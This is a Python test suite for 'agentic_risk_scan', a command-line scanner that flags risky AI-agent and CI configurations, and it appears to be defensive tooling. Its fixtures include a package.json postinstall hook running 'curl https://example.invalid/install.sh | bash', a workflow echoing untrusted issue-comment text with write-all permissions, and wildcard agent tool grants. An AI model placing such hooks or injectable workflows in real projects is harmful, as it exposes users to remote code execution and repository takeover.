from pathlib import Path
from tempfile import TemporaryDirectory
from contextlib import redirect_stderr, redirect_stdout
import json
import subprocess
import unittest
import io

from agentic_risk_scan.cli import main


def run_cli(args: list[str]) -> int:
    stdout = io.StringIO()
    stderr = io.StringIO()
    with redirect_stdout(stdout), redirect_stderr(stderr):
        return main(args)


def capture_cli(args: list[str]) -> tuple[int, str, str]:
    stdout = io.StringIO()
    stderr = io.StringIO()
    with redirect_stdout(stdout), redirect_stderr(stderr):
        code = main(args)
    return code, stdout.getvalue(), stderr.getvalue()


class CLITests(unittest.TestCase):
    def test_json_output_file_and_fail_on_none(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            workflow = root / ".github" / "workflows" / "agent.yml"
            workflow.parent.mkdir(parents=True)
            workflow.write_text(
                """
on: [issue_comment]
permissions: write-all
jobs:
  ai:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.comment.body }}"
""",
                encoding="utf-8",
            )
            output = root / "report.json"

            code = run_cli(["scan", str(root), "--format", "json", "--output", str(output), "--fail-on", "none"])
            self.assertEqual(0, code)
            payload = json.loads(output.read_text(encoding="utf-8"))
            self.assertGreaterEqual(payload["summary"]["total"], 1)

    def test_baseline_filters_findings(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            instructions = root / "AGENTS.md"
            instructions.write_text("allowed-tools: *\n", encoding="utf-8")
            baseline = root / "baseline.json"

            first = run_cli(["scan", str(root), "--update-baseline", str(baseline), "--fail-on", "none"])
            second = run_cli(["scan", str(root), "--baseline", str(baseline), "--fail-on", "medium"])

            self.assertEqual(0, first)
            self.assertEqual(0, second)

    def test_config_suppresses_and_sets_fail_on(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            instructions = root / "AGENTS.md"
            instructions.write_text("allowed-tools: *\n", encoding="utf-8")
            config = root / ".agentic-risk-scan.json"
            config.write_text(
                json.dumps(
                    {
                        "fail_on": "medium",
                        "suppressions": [
                            {
                                "rule_id": "AGENT005",
                                "path": "AGENTS.md",
                                "reason": "test suppression",
                            }
                        ],
                    }
                ),
                encoding="utf-8",
            )

            code = run_cli(["scan", str(root)])
            self.assertEqual(0, code)

    def test_config_severity_override_changes_fail_threshold(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            instructions = root / "AGENTS.md"
            instructions.write_text("allowed-tools: *\n", encoding="utf-8")
            config = root / ".agentic-risk-scan.json"
            config.write_text(
                json.dumps(
                    {
                        "fail_on": "high",
                        "severity_overrides": {
                            "AGENT005": "high"
                        },
                    }
                ),
                encoding="utf-8",
            )

            code, stdout, _ = capture_cli(["scan", str(root)])
            self.assertEqual(1, code)
            self.assertIn("[HIGH] AGENT005", stdout)

    def test_config_excludes_files_and_disable_rule(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            instructions = root / "AGENTS.md"
            instructions.write_text("allowed-tools: *\n", encoding="utf-8")
            config = root / ".agentic-risk-scan.json"
            config.write_text(
                json.dumps({"exclude": ["AGENTS.md"], "fail_on": "medium"}),
                encoding="utf-8",
            )

            excluded = run_cli(["scan", str(root)])
            disabled = run_cli(["scan", str(root), "--no-config", "--disable-rule", "AGENT005", "--fail-on", "medium"])

            self.assertEqual(0, excluded)
            self.assertEqual(0, disabled)

    def test_init_config_refuses_overwrite(self) -> None:
        with TemporaryDirectory() as tmp:
            config = Path(tmp) / ".agentic-risk-scan.json"

            first = run_cli(["init-config", str(config)])
            second = run_cli(["init-config", str(config)])

            self.assertEqual(0, first)
            self.assertEqual(2, second)

    def test_init_ci_writes_default_workflow(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            workflow = root / ".github" / "workflows" / "agentic-risk-scan.yml"

            code = run_cli(["init-ci", "--output", str(workflow)])

            self.assertEqual(0, code)
            text = workflow.read_text(encoding="utf-8")
            self.assertIn("name: agentic-risk-scan", text)
            self.assertIn("pull_request:", text)
            self.assertIn("full-agentic-risk:", text)
            self.assertIn("uses: ecoreal/agentic-risk-scan@v0", text)
            self.assertIn('refs/remotes/origin/${{ github.base_ref }}" --depth=1', text)
            self.assertIn("changed_from: origin/${{ github.base_ref }}", text)
            self.assertIn("format: sarif", text)
            self.assertNotIn("upload-artifact", text)

    def test_init_ci_can_upload_html_report_artifacts(self) -> None:
        with TemporaryDirectory() as tmp:
            workflow = Path(tmp) / "agentic-risk-scan.yml"

            code = run_cli(["init-ci", "--output", str(workflow), "--report-artifact"])

            self.assertEqual(0, code)
            text = workflow.read_text(encoding="utf-8")
            self.assertIn("command: report", text)
            self.assertIn("format: html", text)
            self.assertIn("agentic-risk-pr-report.html", text)
            self.assertIn("agentic-risk-full-report.html", text)
            self.assertIn("actions/upload-artifact@v4", text)
            self.assertIn("if: always()", text)

    def test_init_ci_refuses_overwrite_without_force(self) -> None:
        with TemporaryDirectory() as tmp:
            workflow = Path(tmp) / "scan.yml"

            first = run_cli(["init-ci", "--output", str(workflow), "--mode", "pr"])
            second = run_cli(["init-ci", "--output", str(workflow), "--mode", "full"])
            forced = run_cli(["init-ci", "--output", str(workflow), "--mode", "full", "--force"])

            self.assertEqual(0, first)
            self.assertEqual(2, second)
            self.assertEqual(0, forced)
            text = workflow.read_text(encoding="utf-8")
            self.assertNotIn("pull_request:", text)
            self.assertIn("schedule:", text)
            self.assertIn("jobs:\n  full-agentic-risk:", text)

    def test_inline_ignore_suppresses_same_line_finding(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            instructions = root / "AGENTS.md"
            instructions.write_text("allowed-tools: *  # agentic-risk-scan: ignore AGENT005\n", encoding="utf-8")

            ignored = run_cli(["scan", str(root), "--fail-on", "medium"])
            not_ignored = run_cli(["scan", str(root), "--fail-on", "medium", "--no-inline-ignores"])

            self.assertEqual(0, ignored)
            self.assertEqual(1, not_ignored)

    def test_inline_disable_next_line_suppresses_next_line_finding(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            instructions = root / "AGENTS.md"
            instructions.write_text(
                "<!-- agentic-risk-scan: disable-next-line AGENT005 -->\nallowed-tools: *\n",
                encoding="utf-8",
            )

            code = run_cli(["scan", str(root), "--fail-on", "medium"])
            self.assertEqual(0, code)

    def test_github_annotation_format(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            instructions = root / "AGENTS.md"
            instructions.write_text("allowed-tools: *\n", encoding="utf-8")

            code, stdout, _ = capture_cli(["scan", str(root), "--format", "github", "--fail-on", "none"])
            self.assertEqual(0, code)
            self.assertIn("::warning file=AGENTS.md,line=1,title=AGENT005", stdout)

    def test_rules_markdown_format(self) -> None:
        code, stdout, _ = capture_cli(["rules", "--format", "markdown"])

        self.assertEqual(0, code)
        self.assertIn("## GitHub Actions", stdout)
        self.assertIn("| `GHA001` | critical |", stdout)

    def test_inventory_json_lists_agentic_surfaces(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            workflow = root / ".github" / "workflows" / "agent.yml"
            settings = root / "fixtures" / ".claude" / "settings.json"
            instructions = root / "AGENTS.md"
            mcp = root / ".mcp.json"
            package = root / "package.json"
            workflow.parent.mkdir(parents=True)
            settings.parent.mkdir(parents=True)
            workflow.write_text(
                """
on: [issue_comment]
permissions: write-all
jobs:
  agent:
    runs-on: ubuntu-latest
    steps:
      - run: echo agent
""",
                encoding="utf-8",
            )
            settings.write_text('{"permissions": {"allow": ["Read(src/**)"]}}', encoding="utf-8")
            instructions.write_text("allowed-tools: Read\n", encoding="utf-8")
            mcp.write_text(
                json.dumps({"mcpServers": {"local": {"command": "node", "args": ["server.js"]}}}),
                encoding="utf-8",
            )
            package.write_text(json.dumps({"scripts": {"postinstall": "node setup.js"}}), encoding="utf-8")

            code, stdout, _ = capture_cli(["inventory", str(root), "--format", "json"])

            self.assertEqual(0, code)
            payload = json.loads(stdout)
            categories = {item["category"] for item in payload["items"]}
            self.assertEqual(
                {"agent-config", "agent-instructions", "github-actions", "mcp", "package-scripts"},
                categories,
            )
            config_items = [item for item in payload["items"] if item["category"] == "agent-config"]
            self.assertEqual("fixtures/.claude/settings.json", config_items[0]["path"])

    def test_report_markdown_combines_findings_and_inventory(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            workflow = root / ".github" / "workflows" / "agent.yml"
            instructions = root / "AGENTS.md"
            workflow.parent.mkdir(parents=True)
            workflow.write_text(
                """
on: [issue_comment]
permissions: write-all
jobs:
  agent:
    runs-on: ubuntu-latest
    steps:
      - run: echo agent
""",
                encoding="utf-8",
            )
            instructions.write_text("allowed-tools: *\n", encoding="utf-8")

            code, stdout, _ = capture_cli(["report", str(root), "--fail-on", "none"])

            self.assertEqual(0, code)
            self.assertIn("# Agentic Risk Report", stdout)
            self.assertIn("## Priority Findings", stdout)
            self.assertIn("## Attack Surface Inventory", stdout)
            self.assertIn("GHA002", stdout)
            self.assertIn("AGENT005", stdout)
            self.assertIn("github-actions", stdout)

    def test_report_output_file_and_fail_threshold(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            instructions = root / "AGENTS.md"
            report = root / "agentic-risk-report.md"
            instructions.write_text("allowed-tools: *\n", encoding="utf-8")

            code = run_cli(["report", str(root), "--output", str(report), "--fail-on", "medium"])

            self.assertEqual(1, code)
            text = report.read_text(encoding="utf-8")
            self.assertIn("Risk score", text)
            self.assertIn("AGENT005", text)

    def test_report_html_format(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            instructions = root / "AGENTS.md"
            instructions.write_text("allowed-tools: *\n", encoding="utf-8")

            code, stdout, _ = capture_cli(["report", str(root), "--format", "html", "--fail-on", "none"])

            self.assertEqual(0, code)
            self.assertIn("<!doctype html>", stdout)
            self.assertIn("<title>Agentic Risk Report</title>", stdout)
            self.assertIn("severity-medium", stdout)
            self.assertIn("AGENT005", stdout)
            self.assertIn("Attack Surface Inventory", stdout)

    def test_doctor_json_reports_adoption_checks(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            workflow = root / ".github" / "workflows" / "agentic-risk.yml"
            workflow.parent.mkdir(parents=True)
            workflow.write_text(
                """
name: agentic-risk
on: [pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: ecoreal/agentic-risk-scan@v0
        with:
          command: report
          format: html
          output: agentic-risk-report.html
      - uses: actions/upload-artifact@v4
        with:
          path: agentic-risk-report.html
""",
                encoding="utf-8",
            )
            (root / ".agentic-risk-scan.json").write_text(
                json.dumps({"fail_on": "high", "exclude": []}),
                encoding="utf-8",
            )

            code, stdout, _ = capture_cli(["doctor", str(root), "--format", "json"])

            self.assertEqual(0, code)
            payload = json.loads(stdout)
            self.assertEqual("reporting", payload["maturity"])
            checks = {check["name"]: check for check in payload["checks"]}
            self.assertEqual("pass", checks["project-config"]["status"])
            self.assertEqual("pass", checks["ci-workflow"]["status"])
            self.assertEqual("pass", checks["report-artifact"]["status"])

    def test_doctor_markdown_reports_findings_and_output_file(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            instructions = root / "AGENTS.md"
            output = root / "doctor.md"
            instructions.write_text("allowed-tools: *\n", encoding="utf-8")

            code = run_cli(["doctor", str(root), "--format", "markdown", "--output", str(output), "--no-config"])

            self.assertEqual(0, code)
            text = output.read_text(encoding="utf-8")
            self.assertIn("# Agentic Risk Doctor", text)
            self.assertIn("current-findings", text)
            self.assertIn("lower-severity", text)
            self.assertIn("agent-instructions=1", text)

    def test_composite_action_supports_report_command(self) -> None:
        action = Path(__file__).resolve().parents[1] / "action.yml"
        text = action.read_text(encoding="utf-8")

        self.assertIn("command:", text)
        self.assertIn("scan|report|inventory", text)
        self.assertIn('args=("$command"', text)
        self.assertIn('format="html"', text)
        self.assertIn('output="agentic-risk-report.html"', text)

    def test_changed_only_scans_selected_paths(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            instructions = root / "AGENTS.md"
            package = root / "package.json"
            instructions.write_text("allowed-tools: *\n", encoding="utf-8")
            package.write_text(
                json.dumps({"scripts": {"postinstall": "curl https://example.invalid/install.sh | bash"}}),
                encoding="utf-8",
            )

            code, stdout, _ = capture_cli(
                [
                    "scan",
                    str(root),
                    "--changed",
                    "AGENTS.md",
                    "--format",
                    "json",
                    "--fail-on",
                    "none",
                ]
            )

            self.assertEqual(0, code)
            payload = json.loads(stdout)
            self.assertEqual({"AGENT005"}, {finding["rule_id"] for finding in payload["findings"]})

    def test_changed_from_git_only_scans_diff_files(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            run_git(root, "init", "-b", "main")
            run_git(root, "config", "user.name", "test")
            run_git(root, "config", "user.email", "test@example.invalid")
            (root / "package.json").write_text(
                json.dumps({"scripts": {"postinstall": "curl https://example.invalid/install.sh | bash"}}),
                encoding="utf-8",
            )
            run_git(root, "add", "package.json")
            run_git(root, "commit", "-m", "initial")
            (root / "AGENTS.md").write_text("allowed-tools: *\n", encoding="utf-8")
            run_git(root, "add", "AGENTS.md")
            run_git(root, "commit", "-m", "agent instructions")

            code, stdout, _ = capture_cli(
                [
                    "scan",
                    str(root),
                    "--changed-from",
                    "HEAD~1",
                    "--format",
                    "json",
                    "--fail-on",
                    "none",
                ]
            )

            self.assertEqual(0, code)
            payload = json.loads(stdout)
            self.assertEqual({"AGENT005"}, {finding["rule_id"] for finding in payload["findings"]})

    def test_changed_from_git_with_subdirectory_scan_root(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            project = root / "project"
            project.mkdir()
            run_git(root, "init", "-b", "main")
            run_git(root, "config", "user.name", "test")
            run_git(root, "config", "user.email", "test@example.invalid")
            (root / "package.json").write_text(
                json.dumps({"scripts": {"postinstall": "curl https://example.invalid/install.sh | bash"}}),
                encoding="utf-8",
            )
            run_git(root, "add", "package.json")
            run_git(root, "commit", "-m", "initial")
            (project / "AGENTS.md").write_text("allowed-tools: *\n", encoding="utf-8")
            run_git(root, "add", "project/AGENTS.md")
            run_git(root, "commit", "-m", "agent instructions")

            code, stdout, _ = capture_cli(
                [
                    "scan",
                    str(project),
                    "--changed-from",
                    "HEAD~1",
                    "--format",
                    "json",
                    "--fail-on",
                    "none",
                ]
            )

            self.assertEqual(0, code)
            payload = json.loads(stdout)
            self.assertEqual({"AGENT005"}, {finding["rule_id"] for finding in payload["findings"]})
            self.assertEqual("AGENTS.md", payload["findings"][0]["location"]["path"])


def run_git(root: Path, *args: str) -> None:
    completed = subprocess.run(
        ["git", "-C", str(root), *args],
        check=False,
        capture_output=True,
        text=True,
    )
    if completed.returncode != 0:
        raise AssertionError(completed.stderr or completed.stdout)


if __name__ == "__main__":
    unittest.main()
